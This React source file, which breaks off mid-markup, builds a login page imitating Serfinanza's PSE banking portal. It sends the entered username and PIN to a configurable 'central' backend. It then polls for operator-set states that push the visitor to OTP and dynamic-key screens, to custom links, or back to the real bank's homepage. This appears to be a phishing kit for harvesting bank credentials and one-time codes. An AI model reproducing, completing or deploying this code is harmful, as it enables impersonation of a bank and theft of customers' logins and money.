import React, { useCallback, useEffect, useRef, useState } from "react";
import { FaLock, FaRegUser } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import { Autoplay, Pagination } from "swiper/modules";
import { Swiper, SwiperSlide } from "swiper/react";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingSerfinanza from "../../../../../components/LoadingSerfinanza";
import banner1 from "../../img/banner1.jpg";
import banner2 from "../../img/banner2.jpg";
import banner3 from "../../img/banner3.jpg";
import logo from "../../img/imgi_1_logo2.png";
import vigilado from "../../img/vigilado.jpg";
import "./SerfinanzaLogin.css";
import "swiper/css";
import "swiper/css/pagination";

// Se definen las constantes de error
const SERFINANZA_ERROR_KEY = "serfinanza_error_modal";
const SERFINANZA_MID_FLOW_KEY = "serfinanza_mid_flow";
const SERFINANZA_ERROR_LOGIN_MSG = "Usuario o contraseña inválidos.";
const SERFINANZA_LOGIN_ERROR_AUTO_HIDE_MS = 5000;

const sanitizeSerfinanzaUsername = (value) => value.replace(/[^a-zA-Z0-9]/g, "");

// Se definen los estados tras login
const ESTADOS_TRAS_LOGIN = [
  "sol_otp",
  "sol_din",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_din",
  "error_login",
  "block_ip",
  "error_blocked",
];

// Se crea el metodo para barajar el array
const shuffleArray = (array) => {

  // Se crea el nuevo array
  const newArr = [...array];

  // Se baraja el array
  for (let i = newArr.length - 1; i > 0; i--) {

    // Se captura el indice aleatorio
    const j = Math.floor(Math.random() * (i + 1));

    // Se intercambian los elementos
    [newArr[i], newArr[j]] = [newArr[j], newArr[i]];
  }

  // Se retorna el nuevo array
  return newArr;
};

// Se crea el componente para el keypad virtual
const KeypadVirtual = ({ onKeyPress, onClear, onBackspace, onClose, targetInput, visible = true }) => {

  // Se inicializan las posiciones
  const [position, setPosition] = useState({ top: 0, left: 0 });
  const [shuffled, setShuffled] = useState([]);
  const [isMasked, setIsMasked] = useState(false);
  const keypadRef = useRef(null);

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se valida si el componente esta visible
    if (visible) {

      // Se baraja el array
      setShuffled(shuffleArray([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]));

      // Se desmarca el mask
      setIsMasked(false);
    }
  }, [visible]);

  // Se ejecuta cuando el componente se actualiza
  useEffect(() => {

    // Se crea el metodo para manejar el click fuera del componente
    const handleClickOutside = (event) => {

      // Se valida si el componente esta visible, si existe el keypad, si el click es fuera del keypad y si el click es fuera del target input
      if (visible && keypadRef.current && !keypadRef.current.contains(event.target) && targetInput && !targetInput.contains(event.target)) {

        // Se cierra el keypad
        onClose();
      }
    };

    // Se agrega el evento de click fuera del componente
    document.addEventListener("mousedown", handleClickOutside);

    // Se retorna el cleanup
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, [visible, onClose, targetInput]);

  // Se ejecuta cuando el componente se actualiza
  useEffect(() => {

    // Se valida si existe el target input y el keypad
    if (targetInput && keypadRef.current) {

      // Se captura el rectangulo del target input
      const rect = targetInput.getBoundingClientRect();

      // Se captura la altura y el ancho del keypad
      const keypadHeight = 165;

      // Se captura el ancho del keypad
      const keypadWidth = 250;

      // Se calcula la posicion fija del keypad respecto al viewport
      let top = rect.bottom + 5;

      // Se captura la posicion izquierda del keypad
      let left = rect.left;

      // Se evita que el keypad se salga de la pantalla
      if (top + keypadHeight > window.innerHeight) {

        // Se captura la posicion superior del keypad
        top = rect.top - keypadHeight - 5;
      }

      // Se evita que el keypad se salga de la pantalla
      if (left + keypadWidth > window.innerWidth) {

        // Se captura la posicion izquierda del keypad
        left = window.innerWidth - keypadWidth - 20;
      }

      // Se setea la posicion del keypad
      setPosition({ top, left });
    }
  }, [targetInput, visible]);

  // Se crea el metodo para manejar el click en el keypad
  const handleNumClick = (val) => {

    // Se ejecuta el metodo de key press
    onKeyPress(val);
  };

  // Se valida si el componente no esta visible
  if (!visible) return null;

  // Se retorna el componente
  return (
    <div
      className="keypad-popup"
      ref={keypadRef}
      style={{
        position: "fixed",
        top: `${position.top}px`,
        left: `${position.left}px`,
        display: "block",
      }}
    >
      <div className="keypad-row">
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[0])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[0]}
        </button>
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[1])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[1]}
        </button>
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[2])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[2]}
        </button>
        <button
          type="button"
          className="keypad-special keypad-close"
          onClick={onClose}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          Cerrar
        </button>
      </div>

      <div className="keypad-row">
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[3])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[3]}
        </button>
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[4])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[4]}
        </button>
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[5])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[5]}
        </button>
        <button
          type="button"
          className="keypad-special keypad-clear"
          onClick={onClear}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          Limpiar
        </button>
      </div>

      <div className="keypad-row">
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[6])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[6]}
        </button>
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[7])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[7]}
        </button>
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[8])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[8]}
        </button>
        <button
          type="button"
          className="keypad-special keypad-back"
          onClick={onBackspace}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          Volver
        </button>
      </div>

      <div className="keypad-row">
        <button
          type="button"
          className="keypad-key"
          onClick={() => handleNumClick(shuffled[9])}
          onMouseEnter={() => setIsMasked(true)}
          onMouseLeave={() => setIsMasked(false)}
        >
          {isMasked ? "*" : shuffled[9]}
        </button>
      </div>
    </div>
  );
};

// Se crea el componente para el login de Serfinanza
const SerfinanzaLogin = () => {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializa el loading
  const [getLoading, setLoading] = useState(false);
  const [stepTransitionLoading, setStepTransitionLoading] = useState(false);

  // Se inicializan los estados del formulario
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [modalText, setModalText] = useState("");
  const [showModal, setShowModal] = useState(false);

  // Se inicializan los estados del keypad virtual
  const [showKeypad, setShowKeypad] = useState(false);
  const passwordInputRef = useRef(null);

  // Se inicializan las referencias del polling y control de estados
  const pollingIntervalRef = useRef(null);

  // Se inicializan las referencias de la sessionId, el ultimo estado, la navegacion por polling y el modal de bloqueo de estado
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const closeModalRef = useRef(() => {});

  const clearLoginFormFields = () => {
    setShowPasswordStep(false);
    setUsername("");
    setPassword("");
  };

  const showLoginErrorModal = (message = SERFINANZA_ERROR_LOGIN_MSG) => {
    modalBloqueoEstadoRef.current = "error_login";
    setLoading(false);
    setStepTransitionLoading(false);
    allowPollNavigationRef.current = false;
    sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
    clearLoginFormFields();
    setModalText(message);
    setShowModal(true);
  };

  // Se crea el metodo para parar el polling
  const stopPolling = () => {

    // Se valida si existe un intervalo de polling activo
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia del intervalo
      pollingIntervalRef.current = null;
    }
  };

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se captura el estado de error
    const pendingError = localStorage.getItem(SERFINANZA_ERROR_KEY);
    const midFlow = sessionStorage.getItem(SERFINANZA_MID_FLOW_KEY) === "1";
    const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

    // Se valida si existe error de login pendiente (desde login, OTP o dinámica)
    if (pendingError === "error" || pendingError === "error_login") {
      showLoginErrorModal(SERFINANZA_ERROR_LOGIN_MSG);
      localStorage.removeItem(SERFINANZA_ERROR_KEY);
    } else if (pendingError === "error_otp") {
      redirigir("/serfinanza_otp");
    } else if (pendingError === "error_din") {
      redirigir("/serfinanza_dinamica");
    }

    // Se valida si existe handoff desde /pse
    if (pseHandoff) {

      // Se guarda la sessionId del handoff en localStorage
      localStorage.setItem("sessionId", pseHandoff);

      // Se actualiza la sessionId con el handoff de /pse
      sessionIdRef.current = pseHandoff;

      // Se limpia el ultimo estado
      lastEstadoRef.current = null;

      // Se remueve el handoff y el mid flow previo
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

      // Se remueve el mid flow
      sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

      // Se desactiva la navegacion por polling hasta enviar login
      allowPollNavigationRef.current = false;

      // Se quita el loading
      setLoading(false);
    } else if (midFlow) {

      // Se reanuda mid flow tras recarga de pantalla
      const sid = localStorage.getItem("sessionId");

      // Se actualiza la sessionId
      sessionIdRef.current = sid;

      if (sid) {

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se muestra el loading y se inicia polling
        setLoading(true);

        // Se inicia el polling
        initPolling();
      }
    } else {

      // Se toma la sessionId persistida y no se genera una nueva
      sessionIdRef.current = localStorage.getItem("sessionId");

      // Se desactiva la navegacion por polling hasta enviar login
      allowPollNavigationRef.current = false;
    }

    // Se retorna el cleanup
    return () => {

      // Se para el polling
      stopPolling();
    };
  }, []);

  // Se crea el metodo para manejar el click en el keypad virtual
  const handleKeyPress = (val) => {

    // Se valida la longitud de la contraseña
    if (password.length < 4) {

      // Se actualiza la contraseña
      setPassword((prev) => prev + val);
    }
  };

  // Se crea el metodo para limpiar la contraseña
  const handleClear = () => setPassword("");

  // Se crea el metodo para manejar el backspace en la contraseña
  const handleBackspace = () => setPassword((prev) => prev.slice(0, -1));

  // Se crea el metodo para manejar el paso 1 del formulario
  const handlePaso1 = (event) => {

    // Se previene el comportamiento por defecto del formulario
    event?.currentTarget?.blur();

    // Se sanitiza el usuario (solo letras y números)
    const sanitizedUsername = sanitizeSerfinanzaUsername(username).trim();

    // Se valida si el usuario es requerido
    if (!sanitizedUsername) {

      // Se muestra el modal con el mensaje de error
      setModalText("El usuario es requerido para continuar el proceso.");

      // Se muestra el modal
      setShowModal(true);

      // Se sale del metodo
      return;
    }

    // Se valida la regla de negocio para avanzar al paso de contraseña
    if (sanitizedUsername.length <= 6) {

      // Se mantiene el mismo mensaje para validaciones de usuario
      setModalText("El usuario es requerido para continuar el proceso.");

      // Se muestra el modal
      setShowModal(true);

      // Se sale del metodo
      return;
    }

    // Se cierra el modal
    setShowModal(false);

    // Se inicia el proceso de transicion del paso
    setStepTransitionLoading(true);
  };

  // Se crea el metodo para finalizar el proceso de transicion del paso
  const finishStepTransition = useCallback(() => {

    // Se quita el loading de la transicion del paso
    setStepTransitionLoading(false);

    // Se muestra el paso de contraseña
    setShowPasswordStep(true);
  }, []);

  // Se crea el metodo para cancelar el proceso de transicion del paso
  const handleCancelar = () => {

    // Se quita el loading de la transicion del paso
    setStepTransitionLoading(false);

    // Se quita el loading
    setLoading(false);

    // Se remueve el mid flow
    sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

    // Se desactiva la navegacion por polling
    allowPollNavigationRef.current = false;

    // Se para el polling
    stopPolling();

    // Se limpia el formulario
    setShowPasswordStep(false);

    // Se limpia el usuario
    setUsername("");

    // Se limpia la contraseña
    setPassword("");
  };

  // Se crea el metodo para limpiar el usuario
  const handleClearUsername = () => {

    // Se limpia el usuario
    setUsername("");

    // Se cierra el modal
    setShowModal(false);
  };

  // Se crea el metodo para enviar usuario y clave al backend
  const handleSubmit = async (e) => {

    // Se previene el comportamiento por defecto del formulario
    e?.preventDefault?.();

    // Se valida que el submit real solo ocurra en el paso de contraseña
    if (!showPasswordStep) {

      // Se sale del metodo
      return;
    }

    // Se valida el minimo requerido en el paso de contraseña
    if (!password.trim()) return;

    // Se captura la informacion del formulario
    const usuario = sanitizeSerfinanzaUsername(username).trim();
    const clave = password;

    // Se captura la sessionId desde localStorage
    const sessionId = localStorage.getItem("sessionId");

    // Se valida que exista la sessionId persistida
    if (!sessionId) {

      // Se muestra el modal con el mensaje de error
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

      // Se muestra el modal
      setShowModal(true);

      // Se sale del metodo
      return;
    }

    // Se captura la URL central
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se captura la informacion del formulario
    const dataSend = {
      "data": {
        "attributes": {
          "usuario": usuario,
          "clave": clave,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/serfinanza/authenticacion",
        },
      },
    };

    // Se para el polling
    stopPolling();

    // Se limpia el ultimo estado
    lastEstadoRef.current = null;

    // Se usa el try catch
    try {

      // Se muestra el loading
      setLoading(true);

      // Se realiza la peticion al backend
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/serfinanza/authenticacion", dataSend);

      // Se valida si la respuesta es exitosa
      if (response?.data?.success) {

        // Se captura la sessionId
        const sid = response.data.sessionId ?? sessionId;

        // Se guarda la sessionId en el localStorage
        localStorage.setItem("sessionId", sid);

        // Se actualiza la sessionId
        sessionIdRef.current = sid;

        // Se setea el mid flow
        sessionStorage.setItem(SERFINANZA_MID_FLOW_KEY, "1");

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se inicia el polling
        initPolling();
      } else {

        // Se quita el loading
        setLoading(false);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        showLoginErrorModal(SERFINANZA_ERROR_LOGIN_MSG);
      }
    } catch (error) {

      // Se quita el loading
      setLoading(false);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se captura el status y estado del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el estado es de bloqueo de IP
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

        // Se limpia el storage de la sesion
        localStorage.clear();

        // Se redirige al inicio del banco
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del metodo
        return;
      }

      // Se muestra el modal con el mensaje de error
      setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");

      // Se muestra el modal
      setShowModal(true);
    }
  };

  // Se crea el metodo para iniciar el polling
  const initPolling = () => {

    // Se para el polling
    stopPolling();

    // Se inicia el intervalo de polling
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se verifica el estado
    verifyState();
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la peticion al backend
      const response = await instanceBackend.post(`/serfinanza/verify-state/${sessionIdRef.current}`);

      // Se captura la respuesta
      const { estado: estadoRaw, url, text, tc, tarjeta, bank } = response?.data || {};

      // Se captura el estado actual
      const estadoActual = (estadoRaw || "").toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());
      const customLink = hasUrl ? url : text && String(text).trim() ? text : null;
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;
      const linkPendiente = estadoActual === "sol_link_bot" || (estadoActual === "link_bot" && !hasUrl) || (estadoActual === "sol_link_custom" && !customLink);

      // Se valida si existe estado para procesar
      if (!estadoActual) return;

      // Se evita reprocesar el mismo estado despues de cerrar modal
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado actual es el mismo que el estado a ignorar
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;

        // Se limpia el estado a ignorar
        ignorarEstadoHastaCambioRef.current = null;

        // Se limpia el estado bloqueado del modal
        modalBloqueoEstadoRef.current = null;
      }

      // Se evita reabrir modal por el mismo estado bloqueado
      if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {

        // Se sale del metodo
        return;
      }

      // Se evita navegar por polling si aun no hay accion del usuario
      if (ESTADOS_TRAS_LOGIN.includes(estadoActual) && !allowPollNavigationRef.current) {

        // Se sale del metodo
        return;
      }

      // Se evita reprocesar estados repetidos cuando no hay link pendiente
      if (!linkPendiente && lastEstadoRef.current === estadoActual) return;

      // Se actualiza el estado actual
      if (!linkPendiente) lastEstadoRef.current = estadoActual;

      // Se maneja la navegacion segun el estado retornado por verifyState
      switch (estadoActual) {
        case "sol_otp":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {

            // Se redirige a la pantalla OTP Serfinanza
            redirigir("/serfinanza_otp");
          }

          // Se sale del switch
          break;
        case "sol_din":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se redirige a la pantalla dinamica Serfinanza
          redirigir("/serfinanza_dinamica");

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se limpia el storage de la sesion
          localStorage.clear();
          sessionStorage.clear();

          // Se redirige al finalizado TC cuando la sesión viene por tarjeta
          if (isTcSession) {

            // Se redirige al finalizado TC cuando la sesión viene por tarjeta
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige al finalizado PSE cuando la sesión no viene por tarjeta
            window.location.href = `/finalizado-pse?sessionId=${sessionIdRef.current}`;
          }

          // Se sale del switch
          break;
        case "error_otp":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se setea el estado de error OTP para mostrar modal al llegar a la pantalla
          localStorage.setItem(SERFINANZA_ERROR_KEY, "error_otp");

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se redirige a la pantalla OTP Serfinanza
            redirigir("/serfinanza_otp");
          }

          // Se sale del switch
          break;
        case "error_din":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de error
          localStorage.setItem(SERFINANZA_ERROR_KEY, "error_din");

          // Se redirige a la pantalla dinamica Serfinanza
          redirigir("/serfinanza_dinamica");

          // Se sale del switch
          break;
        case "error_login":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          showLoginErrorModal(SERFINANZA_ERROR_LOGIN_MSG);

          // Se sale del switch
          break;
        case "link_bot":

          // Se valida si existe URL para redireccion
          if (hasUrl) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

            // Se redirige al link del bot
            window.location.href = url;
          }

          // Se sale del switch
          break;
        case "sol_link_custom":

          // Se valida si existe link personalizado
          if (customLink) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

            // Se redirige al link personalizado
            window.location.href = customLink;
          }

          // Se sale del switch
          break;
        case "block_ip":
        case "error_blocked":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se muestra el modal de bloqueo
          setModalText("Acceso bloqueado por seguridad.");

          // Se muestra el modal de bloqueo
          setShowModal(true);

          // Se sale del switch
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (error) {

      // Se captura el status y estado del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el estado corresponde a bloqueo de IP
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se quita el loading
        setLoading(false);

        // Se remueve el mid flow
        sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se limpia el storage y se redirige al inicio del banco
        localStorage.clear();

        // Se redirige al inicio del banco
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Se crea el metodo para redirigir rutas internas
  const redirigir = (ruta) => {

    // Se redirige a la ruta indicada
    navigate(ruta);
  };

  // Se crea el metodo para cerrar el modal
  const closeModal = () => {

    // Se captura el estado que abrió el modal
    const estadoServidor = modalBloqueoEstadoRef.current;

    // Se limpia el estado bloqueado del modal
    modalBloqueoEstadoRef.current = null;

    // Se ignora temporalmente error_login hasta que cambie
    if (estadoServidor === "error_login") {

      // Se ignora temporalmente error_login hasta que cambie
      ignorarEstadoHastaCambioRef.current = "error_login";
    }

    // Se cierra el modal y estados de carga visual
    setShowModal(false);

    // Se quita el loading
    setLoading(false);

    // Se quita el loading de la transicion de paso
    setStepTransitionLoading(false);

    // Se resetea el formulario cuando el modal fue por error_login
    if (estadoServidor === "error_login") {

      // Se remueve el mid flow
      sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      clearLoginFormFields();
    }
  };

  closeModalRef.current = closeModal;

  useEffect(() => {
    if (!showModal) return undefined;

    const timer = window.setTimeout(() => {
      closeModalRef.current();
    }, SERFINANZA_LOGIN_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showModal]);

  // Se inicializan los estados de habilitacion de botones
  const isPaso1SubmitDisabled = username.trim().length === 0 || stepTransitionLoading || getLoading;
  const isPaso2SubmitDisabled = password.trim().length < 4;

  // Se crea el metodo para orquestar el submit por etapas
  const handleFormSubmit = (e) => {

    // Se previene el comportamiento por defecto del formulario
    e.preventDefault();

    // Se valida el paso 1 para avanzar al siguiente estado
    if (!showPasswordStep) {

      // Se valida si esta en proceso de transicion
      if (stepTransitionLoading) return;

      // Se ejecuta el paso 1
      handlePaso1(e);

      // Se sale del metodo
      return;
    }

    // Se ejecuta el envio real en el paso 2
    handleSubmit(e);
  };

  // Se retorna el HTML
  return (
    <div className="serfinanza-page">
      {/* Se renderiza el header principal */}
      <header className="head-login">
        <div className="header-inner">
          <div className="logo-block">
            <img
              className="logo-img"
              src={logo}
              alt="Serfinanza"
              onError={(e) => {
                if (e.target.dataset.failed) return;
                e.target.dataset.failed = "true";
                e.target.style.display = "none";
                const fallback = document.createElement("span");
                fallback.className = "logo-fallback-text";
                fallback.innerText = "Serfinanza";
                e.target.parentNode.appendChild(fallback);
              }}
            />
            <div className="header-tagline-container">
              <h1 className="tituloPagoPSE">PAGOS PSE BANCA PERSONAS</h1>
            </div>
          </div>
        </div>
      </header>

      {/* Se renderiza el contenido principal */}
      <main className="main-container">
        <div className="content-wrapper">
          {/* Se renderiza la columna izquierda */}
          <div className="login-section">
            <div className="row-serfinanza" style={{ position: "relative" }}>
              {/* Se renderiza el logo de Superfinanciera */}
              <div className="col-1-serfinanza logo-super">
                <img
                  src={vigilado}
                  alt="Vigilado Superfinanciera"
                  onError={(e) => {
                    e.target.style.display = "none";
                    e.target.parentElement.innerHTML =
                      '<span class="vigilado-text">VIGILADO SUPERFINANCIERA</span>';
                  }}
                />
              </div>

              {/* Se renderiza el formulario de login */}
              <div className="col-11-serfinanza">
                <div className="container-serfinanza">
                  <form className="form-signin" onSubmit={handleFormSubmit}>
                    <div className="card">
                      <div className="card-body">
                        {!showPasswordStep ? (
                          <div className="row-serfinanza">
                            <div className="col-12-serfinanza col-serfinanza-titulo">
                              <h1 className="TituloSerfiAzul">
                                BIENVENIDO A TU SERFINANZA VIRTUAL PERSONAS
                              </h1>
                            </div>

                            <div className="col-12-serfinanza col-md-10-serfinanza mx-auto-serfinanza">
                              {/* Se renderiza el input de usuario */}
                              <div className="md-form input-group inputGroupLogin">
                                <div className="input-group-prepend">
                                  <span className="input-group-text md-addon">
                                    <span
                                      className="IconInput"
                                      role="img"
                                      aria-label="Usuario"
                                    >
                                      <FaRegUser aria-hidden />
                                    </span>
                                  </span>
                                </div>
                                <input
                                  type="text"
                                  className="form-control BordeAzulRadius InputUsuarioLineaFocus"
                                  placeholder="Ingresa tu usuario"
                                  value={username}
                                  onChange={(e) => {
                                    const nextValue = sanitizeSerfinanzaUsername(
                                      e.target.value,
                                    );
                                    setUsername(nextValue);

                                    // Se oculta el modal cuando el campo deja de estar vacio
                                    if (nextValue.trim()) {
                                      setShowModal(false);
                                    }
                                  }}
                                  autoComplete="off"
                                  spellCheck={false}
                                />
                              </div>

                              {/* Se renderizan los botones de accion */}
                              <div
                                className="text-center"
                                style={{ marginTop: "20px" }}
                              >
                                <div className="mb-3">
                                  <button
                                    type="submit"
                                    className="btn-primary-2"
                                    disabled={isPaso1SubmitDisabled}
                                  >
                                    Ingresar
                                  </button>
                                </div>
                                <div>
                                  <button
                                    type="button"
                                    className="btn-secondary-2"
                                    onClick={handleClearUsername}
                                  >
                                    Borrar
                                  </button>
                                </div>
                              </div>
                            </div>
                          </div>
                        ) : (
                          <div className="row-serfinanza">
                            <div className="col-12-serfinanza col-serfinanza-titulo">
                              <h1 className="TituloSerfiAzul TituloSerfiAzulClave">
                                ingresa tu contraseña
                              </h1>
                            </div>

                            <div className="col-12-serfinanza col-md-10-serfinanza mx-auto-serfinanza">
                              <div className="md-form input-group inputGroupLogin">
                                <div className="input-group-prepend">
                                  <span className="input-group-text md-addon">
                                    <span
                                      className="IconInput IconInputLock"
                                      role="img"
                                      aria-label="Contraseña"
                                    >
                                      <FaLock aria-hidden />
                                    </span>
                                  </span>
                                </div>
                                <input
                                  ref={passwordInputRef}
                                  type="password"
                                  className="form-control BordeAzulRadius InputUsuarioLineaFocus"
                                  placeholder="Ingresa tu contraseña"
                                  maxLength="4"
                                  value={password}
                                  onFocus={() => setShowKeypad(true)}
                                  readOnly
                                />
                                <KeypadVirtual
                                  visible={showKeypad}
                                  targetInput={passwordInputRef.current}
                                  onKeyPress={handleKeyPress}
                                  onClear={handleClear}
                                  onBackspace={handleBackspace}
                                  onClose={() => setShowKeypad(false)}
                                />
                              </div>

                              <div
                                className="text-center"
                                style={{ marginTop: "20px" }}
                              >
                                <div
                                  className="dual-buttons-serfinanza"
                                  style={{
                                    display: "flex",
                                    justifyContent: "center",
                                    gap: "12px",
                                    marginBottom: "16px",
                                  }}
                                >
                                  <button
                                    type="submit"
                                    className="btn-primary-2"
                                    disabled={
                                      isPaso2SubmitDisabled || getLoading
                                    }
                                  >
                                    Ingresar
                                  </button>
                                  <button
                                    type="button"
                                    className="btn-secondary-2"
                                    onClick={handleCancelar}
                                    style={{ padding: "9px 36px" }}
                                  >
                                    Corregir
                                  </button>
                                </div>
                                <div className="mt-3">
                                  <button
                                    type="button"
                                    className="btn-secondary-2"
                                    onClick={handleCancelar}
                                  >
                                    Regresar Al Comercio
                                  </button>
                                </div>
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
